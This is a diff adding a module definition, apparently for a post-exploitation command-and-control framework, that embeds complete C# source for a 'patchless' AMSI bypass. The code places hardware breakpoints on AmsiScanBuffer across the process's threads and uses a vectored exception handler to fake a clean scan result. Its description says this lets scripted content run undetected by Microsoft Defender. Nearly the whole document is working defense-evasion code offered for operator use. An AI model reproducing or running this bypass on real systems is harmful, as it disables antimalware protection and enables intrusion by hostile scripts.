@@ -1,0 +1,470 @@
+name: PatchlessAMSI
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Antimalware Scan Interface (AMSI) allows providers such as Microsoft Defender to inspect script and in-memory content before execution. This module implements a patchless AMSI bypass by placing a hardware breakpoint on amsi.dll!AmsiScanBuffer and handling the resulting single-step exception with a vectored exception handler (VEH). Unlike classic AMSI bypasses that patch AmsiScanBuffer bytes in memory, this approach avoids modifying executable code and reduces detection opportunities tied to inline patch signatures. When triggered, the handler short-circuits the function and forces a clean scan result path so scripted content can continue executing.
+software: ''
+tactics: [TA0005]
+techniques: [T1562.001]
+background: false
+output_extension: ''
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+comments:
+  - https://gist.github.com/CCob/fe3b63d80890fafeca982f76c8a3efdf
+  - https://github.com/EvilBytecode/Ebyte-amsi-patchless-vehhwbp
+options:
+  - name: Agent
+    description: Agent to run module on.
+    required: true
+    value: ''
+  - name: Action
+    description: Enable or disable the AMSI bypass.
+    required: true
+    value: enable
+    strict: true
+    suggested_values:
+      - enable
+      - disable
+csharp:
+  UnsafeCompile: true
+  CompatibleDotNetVersions:
+    - Net40
+  Code: |
+    using System;
+    using System.Diagnostics;
+    using System.Runtime.InteropServices;
+    using System.Threading;
+
+    public static class Program
+    {
+        private const uint STATUS_SINGLE_STEP = 0x80000004;
+        private const int EXCEPTION_CONTINUE_EXECUTION = -1;
+        private const int EXCEPTION_CONTINUE_SEARCH = 0;
+        private const uint CONTEXT_DEBUG_REGISTERS = 0x00100010;
+        private const uint THREAD_GET_CONTEXT = 0x0008;
+        private const uint THREAD_SET_CONTEXT = 0x0010;
+        private const uint THREAD_SUSPEND_RESUME = 0x0002;
+        private const uint TH32CS_SNAPTHREAD = 0x00000004;
+
+        private static IntPtr _amsiScanBuffer = IntPtr.Zero;
+        private static IntPtr _vehHandle = IntPtr.Zero;
+        private static readonly VectoredExceptionHandler _vehDelegate = ExceptionHandler;
+        private static bool _enabled;
+
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
+        private delegate int VectoredExceptionHandler(IntPtr exceptionInfo);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct EXCEPTION_POINTERS
+        {
+            public IntPtr ExceptionRecord;
+            public IntPtr ContextRecord;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct EXCEPTION_RECORD
+        {
+            public uint ExceptionCode;
+            public uint ExceptionFlags;
+            public IntPtr ExceptionRecord;
+            public IntPtr ExceptionAddress;
+            public uint NumberParameters;
+
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 15)]
+            public ulong[] ExceptionInformation;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct CONTEXT64
+        {
+            public ulong P1Home;
+            public ulong P2Home;
+            public ulong P3Home;
+            public ulong P4Home;
+            public ulong P5Home;
+            public ulong P6Home;
+            public uint ContextFlags;
+            public uint MxCsr;
+            public ushort SegCs;
+            public ushort SegDs;
+            public ushort SegEs;
+            public ushort SegFs;
+            public ushort SegGs;
+            public ushort SegSs;
+            public uint EFlags;
+            public ulong Dr0;
+            public ulong Dr1;
+            public ulong Dr2;
+            public ulong Dr3;
+            public ulong Dr6;
+            public ulong Dr7;
+            public ulong Rax;
+            public ulong Rcx;
+            public ulong Rdx;
+            public ulong Rbx;
+            public ulong Rsp;
+            public ulong Rbp;
+            public ulong Rsi;
+            public ulong Rdi;
+            public ulong R8;
+            public ulong R9;
+            public ulong R10;
+            public ulong R11;
+            public ulong R12;
+            public ulong R13;
+            public ulong R14;
+            public ulong R15;
+            public ulong Rip;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct THREADENTRY32
+        {
+            public uint dwSize;
+            public uint cntUsage;
+            public uint th32ThreadID;
+            public uint th32OwnerProcessID;
+            public int tpBasePri;
+            public int tpDeltaPri;
+            public uint dwFlags;
+        }
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+        private static extern IntPtr GetModuleHandle(string moduleName);
+
+        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
+        private static extern IntPtr GetProcAddress(IntPtr moduleHandle, string procName);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint GetCurrentProcessId();
+
+        [DllImport("kernel32.dll")]
+        private static extern uint GetCurrentThreadId();
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool GetThreadContext(IntPtr threadHandle, ref CONTEXT64 context);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool SetThreadContext(IntPtr threadHandle, ref CONTEXT64 context);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint SuspendThread(IntPtr threadHandle);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint ResumeThread(IntPtr threadHandle);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr CreateToolhelp32Snapshot(uint flags, uint processId);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool Thread32First(IntPtr snapshotHandle, ref THREADENTRY32 threadEntry);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool Thread32Next(IntPtr snapshotHandle, ref THREADENTRY32 threadEntry);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr handle);
+
+        [DllImport("kernel32.dll")]
+        private static extern IntPtr AddVectoredExceptionHandler(uint firstHandler, VectoredExceptionHandler handler);
+
+        [DllImport("kernel32.dll")]
+        private static extern uint RemoveVectoredExceptionHandler(IntPtr handle);
+
+        public static void Main(string[] args)
+        {
+            if (IntPtr.Size != 8)
+            {
+                Console.WriteLine("PatchlessAMSI currently supports x64 contexts only.");
+                return;
+            }
+
+            string action = args.Length > 0 ? args[0].ToLowerInvariant() : "enable";
+
+            if (action == "enable")
+            {
+                Enable();
+                return;
+            }
+
+            if (action == "disable")
+            {
+                Disable();
+                return;
+            }
+
+            Console.WriteLine("Invalid Action. Use 'enable' or 'disable'.");
+        }
+
+        private static void Enable()
+        {
+            if (_enabled)
+            {
+                Console.WriteLine("Patchless AMSI bypass is already enabled.");
+                return;
+            }
+
+            IntPtr amsiModule = GetModuleHandle("amsi.dll");
+            if (amsiModule == IntPtr.Zero)
+            {
+                Console.WriteLine("amsi.dll is not loaded in the current process.");
+                return;
+            }
+
+            _amsiScanBuffer = GetProcAddress(amsiModule, "AmsiScanBuffer");
+            if (_amsiScanBuffer == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed to resolve AmsiScanBuffer.");
+                return;
+            }
+
+            _vehHandle = AddVectoredExceptionHandler(1, _vehDelegate);
+            if (_vehHandle == IntPtr.Zero)
+            {
+                Console.WriteLine("Failed to register vectored exception handler.");
+                return;
+            }
+
+            int patched = SetBreakpointOnAllThreads(_amsiScanBuffer);
+            if (patched == 0)
+            {
+                RemoveVectoredExceptionHandler(_vehHandle);
+                _vehHandle = IntPtr.Zero;
+                Console.WriteLine("Failed to set hardware breakpoint on any thread.");
+                return;
+            }
+
+            _enabled = true;
+            Console.WriteLine("Patchless AMSI bypass enabled on " + patched + " thread(s).");
+        }
+
+        private static void Disable()
+        {
+            int cleared = ClearBreakpointOnAllThreads();
+            bool handlerRemoved = true;
+
+            if (_vehHandle != IntPtr.Zero)
+            {
+                handlerRemoved = RemoveVectoredExceptionHandler(_vehHandle) != 0;
+                _vehHandle = IntPtr.Zero;
+            }
+
+            _enabled = false;
+            _amsiScanBuffer = IntPtr.Zero;
+
+            if (cleared > 0 && handlerRemoved)
+            {
+                Console.WriteLine("Patchless AMSI bypass disabled (" + cleared + " thread(s) cleared).");
+            }
+            else
+            {
+                Console.WriteLine("Patchless AMSI bypass disable completed with warnings.");
+            }
+        }
+
+        private static int SetBreakpointOnAllThreads(IntPtr targetAddress)
+        {
+            int patched = 0;
+            uint currentPid = GetCurrentProcessId();
+            uint helperTid = GetCurrentThreadId();
+
+            IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (snapshot == IntPtr.Zero || snapshot == new IntPtr(-1))
+            {
+                return 0;
+            }
+
+            try
+            {
+                THREADENTRY32 entry = new THREADENTRY32();
+                entry.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
+
+                if (!Thread32First(snapshot, ref entry))
+                {
+                    return 0;
+                }
+
+                do
+                {
+                    if (entry.th32OwnerProcessID != currentPid)
+                        continue;
+
+                    if (entry.th32ThreadID == helperTid)
+                        continue;
+
+                    IntPtr hThread = OpenThread(
+                        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
+                        false,
+                        entry.th32ThreadID);
+
+                    if (hThread == IntPtr.Zero)
+                        continue;
+
+                    try
+                    {
+                        SuspendThread(hThread);
+
+                        CONTEXT64 ctx = new CONTEXT64();
+                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+                        if (GetThreadContext(hThread, ref ctx))
+                        {
+                            ctx.Dr0 = (ulong)targetAddress.ToInt64();
+                            ctx.Dr7 &= ~(0xFUL << 16);
+                            ctx.Dr7 |= 1UL;
+                            ctx.Dr6 = 0;
+
+                            if (SetThreadContext(hThread, ref ctx))
+                            {
+                                patched++;
+                            }
+                        }
+
+                        ResumeThread(hThread);
+                    }
+                    finally
+                    {
+                        CloseHandle(hThread);
+                    }
+                } while (Thread32Next(snapshot, ref entry));
+            }
+            finally
+            {
+                CloseHandle(snapshot);
+            }
+
+            return patched;
+        }
+
+        private static int ClearBreakpointOnAllThreads()
+        {
+            int cleared = 0;
+            uint currentPid = GetCurrentProcessId();
+            uint helperTid = GetCurrentThreadId();
+
+            IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+            if (snapshot == IntPtr.Zero || snapshot == new IntPtr(-1))
+            {
+                return 0;
+            }
+
+            try
+            {
+                THREADENTRY32 entry = new THREADENTRY32();
+                entry.dwSize = (uint)Marshal.SizeOf(typeof(THREADENTRY32));
+
+                if (!Thread32First(snapshot, ref entry))
+                {
+                    return 0;
+                }
+
+                do
+                {
+                    if (entry.th32OwnerProcessID != currentPid)
+                        continue;
+
+                    if (entry.th32ThreadID == helperTid)
+                        continue;
+
+                    IntPtr hThread = OpenThread(
+                        THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME,
+                        false,
+                        entry.th32ThreadID);
+
+                    if (hThread == IntPtr.Zero)
+                        continue;
+
+                    try
+                    {
+                        SuspendThread(hThread);
+
+                        CONTEXT64 ctx = new CONTEXT64();
+                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
+
+                        if (GetThreadContext(hThread, ref ctx))
+                        {
+                            ctx.Dr0 = 0;
+                            ctx.Dr7 &= ~1UL;
+                            ctx.Dr6 = 0;
+
+                            if (SetThreadContext(hThread, ref ctx))
+                            {
+                                cleared++;
+                            }
+                        }
+
+                        ResumeThread(hThread);
+                    }
+                    finally
+                    {
+                        CloseHandle(hThread);
+                    }
+                } while (Thread32Next(snapshot, ref entry));
+            }
+            finally
+            {
+                CloseHandle(snapshot);
+            }
+
+            return cleared;
+        }
+
+        private static int ExceptionHandler(IntPtr exceptionInfoPtr)
+        {
+            EXCEPTION_POINTERS exceptionPointers = (EXCEPTION_POINTERS)Marshal.PtrToStructure(exceptionInfoPtr, typeof(EXCEPTION_POINTERS));
+            EXCEPTION_RECORD exceptionRecord = (EXCEPTION_RECORD)Marshal.PtrToStructure(exceptionPointers.ExceptionRecord, typeof(EXCEPTION_RECORD));
+
+            if (exceptionRecord.ExceptionCode != STATUS_SINGLE_STEP)
+            {
+                return EXCEPTION_CONTINUE_SEARCH;
+            }
+
+            if (exceptionRecord.ExceptionAddress != _amsiScanBuffer)
+            {
+                return EXCEPTION_CONTINUE_SEARCH;
+            }
+
+            CONTEXT64 context = (CONTEXT64)Marshal.PtrToStructure(exceptionPointers.ContextRecord, typeof(CONTEXT64));
+
+            try
+            {
+                IntPtr resultPointerAddress = (IntPtr)((long)context.Rsp + 0x20L);
+                IntPtr amsiResultPointer = Marshal.ReadIntPtr(resultPointerAddress);
+                if (amsiResultPointer != IntPtr.Zero)
+                {
+                    Marshal.WriteInt32(amsiResultPointer, 0);
+                }
+            }
+            catch
+            {
+            }
+
+            ulong returnAddress = (ulong)Marshal.ReadInt64((IntPtr)(long)context.Rsp);
+            context.Rax = 0;
+            context.Rip = returnAddress;
+            context.Rsp += 8;
+
+            Marshal.StructureToPtr(context, exceptionPointers.ContextRecord, false);
+            return EXCEPTION_CONTINUE_EXECUTION;
+        }
+    }
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+    - Name: mscorlib.dll
+      Location: net40\mscorlib.dll
+      DotNetVersion: Net40
+    - Name: System.dll
+      Location: net40\System.dll
+      DotNetVersion: Net40
+    - Name: System.Core.dll
+      Location: net40\System.Core.dll
+      DotNetVersion: Net40
+  EmbeddedResources: []
